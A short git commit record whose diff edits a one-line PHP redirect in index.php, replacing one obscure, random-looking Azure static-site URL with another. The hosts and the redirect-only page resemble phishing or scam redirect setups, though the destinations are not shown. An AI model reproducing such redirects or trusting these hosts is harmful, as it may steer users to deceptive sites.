556765fdbbc68e3b7a43466f24502512249c9879
mancillajoaquin204 <mancillajoaquin204@gmail.com>
2025-02-28 19:49:04 +0530

    Update index.php

--- index.php
+++ index.php
@@ -2,7 +2,7 @@
 <?php
  
 // Redirect browser
-header("Location: https://12coreitrofixxxeccore.z13.web.core.windows.net/e4f3rev33rfefsdfwe/index.html");
+header("Location: https://auracorefxx76coxx.z19.web.core.windows.net/");
  
 exit;
 ?>
